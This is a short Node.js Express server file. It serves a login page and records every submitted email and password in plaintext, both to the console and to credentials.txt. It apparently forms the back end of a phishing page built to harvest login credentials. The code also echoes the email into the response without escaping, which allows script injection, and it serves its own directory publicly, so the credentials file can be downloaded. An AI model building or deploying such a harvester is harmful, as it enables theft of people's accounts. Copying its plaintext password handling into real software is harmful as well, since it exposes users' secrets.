// server.js

// Import necessary modules
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;

// Middleware to parse URL-encoded bodies (from HTML forms)
// This is necessary to access the form data sent via POST
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));
// Serve the 'login.html' file when a user navigates to the root URL '/'
app.get('/', (req, res) => {
    // __dirname is a Node.js global variable that stores the path to the current directory
    res.sendFile(path.join(__dirname, '/login.html'));
});

// A POST endpoint to handle the form submission from the login page
app.post('/save', (req, res) => {
    // req.body contains the submitted form data
    const { email, password } = req.body;

    // Log the username and password to the server console
    console.log('Received login details:');
    console.log(`Username: ${email}`);
    console.log(`Password: ${password}`);

    const dataToWrite = `${email}---${password}\n`;

    // Write the data to a file named 'credentials.txt'
    fs.appendFile('credentials.txt', dataToWrite, (err) => {
        if (err) {
            console.error('Failed to write to file:', err);
            return res.status(500).send('<h1>Error saving data.</h1>');
        }
        console.log('User data successfully written to credentials.txt');
    });
    // Send a response back to the client
    res.send(`<h1>Thank you, ${email}! Your data has been received.</h1>`);

});

// Start the server and listen on the specified port
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
    console.log('Ready to receive login data...');
});
